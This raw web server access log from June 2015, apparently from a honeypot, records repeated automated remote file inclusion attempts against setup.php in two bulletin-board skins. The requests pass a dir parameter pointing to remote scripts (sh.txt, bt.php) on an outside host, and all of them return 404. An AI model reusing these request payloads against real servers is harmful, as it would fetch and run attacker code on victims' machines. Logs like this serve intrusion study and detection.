180.179.212.237 - - [28/Jun/2015:17:54:41 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:55:42 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:55:43 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:55:44 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:55:45 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:55:51 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:55:52 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:55:57 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:55:59 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:56:04 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:56:06 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:56:06 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:56:08 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:56:10 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:56:16 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:56:17 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:56:18 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:56:19 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:56:20 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:56:26 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:56:32 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:56:38 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:56:39 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:56:39 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
180.179.212.237 - - [28/Jun/2015:17:56:41 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)" 
27.50.84.253 - - [28/Jun/2015:17:57:10 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 6.1; Trident/5.0)" 
27.50.84.253 - - [28/Jun/2015:17:57:12 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 6.1; Trident/5.0)" 
27.50.84.253 - - [28/Jun/2015:17:57:12 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 6.1; Trident/5.0)" 
27.50.84.253 - - [28/Jun/2015:17:57:13 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 6.1; Trident/5.0)" 
27.50.84.253 - - [28/Jun/2015:17:57:14 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 6.1; Trident/5.0)" 
27.50.84.253 - - [28/Jun/2015:17:57:15 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 6.1; Trident/5.0)" 
27.50.84.253 - - [28/Jun/2015:17:57:16 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 6.1; Trident/5.0)" 
27.50.84.253 - - [28/Jun/2015:17:57:17 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 6.1; Trident/5.0)" 
27.50.84.253 - - [28/Jun/2015:17:57:18 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 6.1; Trident/5.0)" 
27.50.84.253 - - [28/Jun/2015:17:57:19 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 6.1; Trident/5.0)" 
27.50.84.253 - - [28/Jun/2015:17:57:20 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 6.1; Trident/5.0)" 
27.50.84.253 - - [28/Jun/2015:17:57:21 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 6.1; Trident/5.0)" 
74.208.180.80 - - [28/Jun/2015:18:00:44 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:00:45 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:00:45 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:00:46 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:00:47 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:00:48 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:00:48 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:00:49 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:00:49 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:00:51 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:00:51 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:00:52 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
82.98.160.235 - - [28/Jun/2015:18:08:58 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
82.98.160.235 - - [28/Jun/2015:18:08:59 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
82.98.160.235 - - [28/Jun/2015:18:08:59 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
82.98.160.235 - - [28/Jun/2015:18:09:01 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
82.98.160.235 - - [28/Jun/2015:18:09:01 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
82.98.160.235 - - [28/Jun/2015:18:09:02 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
82.98.160.235 - - [28/Jun/2015:18:09:02 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
82.98.160.235 - - [28/Jun/2015:18:09:03 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
82.98.160.235 - - [28/Jun/2015:18:09:04 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
82.98.160.235 - - [28/Jun/2015:18:09:05 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
82.98.160.235 - - [28/Jun/2015:18:09:05 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
82.98.160.235 - - [28/Jun/2015:18:09:06 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
74.208.180.80 - - [28/Jun/2015:18:14:31 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:14:32 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:14:33 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:14:35 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:14:35 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:14:36 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:14:36 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:14:37 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:14:38 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:14:39 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:14:39 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
74.208.180.80 - - [28/Jun/2015:18:14:40 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1" 
123.125.71.96 - - [28/Jun/2015:18:16:30 -0700] "GET / HTTP/1.1" 200 7006 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
112.218.68.155 - - [28/Jun/2015:18:18:41 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:18:43 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:18:43 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:18:45 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:18:46 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:18:47 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:18:47 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:18:49 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:18:49 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:18:51 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:18:51 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:18:53 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
181.65.186.34 - - [28/Jun/2015:18:19:39 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:19:40 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:19:40 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:19:41 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:19:42 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:19:43 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:19:43 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:19:44 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:19:44 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:19:45 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:19:46 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:19:47 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
